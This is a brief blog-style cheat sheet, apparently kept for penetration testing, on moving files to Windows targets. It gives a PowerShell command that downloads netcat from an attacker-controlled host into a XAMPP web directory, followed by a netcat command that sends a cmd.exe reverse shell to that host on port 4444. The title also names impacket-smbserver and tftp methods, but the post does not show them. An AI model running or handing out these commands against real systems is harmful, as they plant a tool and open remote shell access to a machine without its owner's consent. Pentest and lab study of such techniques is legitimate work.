---
layout: post
title:  "file transfer - windows - powershell / impacket-smbserver / tftp"
date:   2022-01-01
categories: web
---


## Download Files

```bash

powershell.exe Invoke-WebRequest -Uri "http://<my ip>:81/netcat/nc64.exe" -OutFile "C:\xampp\htdocs\nc.exe"

```

## Reverse Shell


```bash

cmd.exe /c C:\xampp\htdocs\nc.exe -e cmd.exe <my ip> 4444

```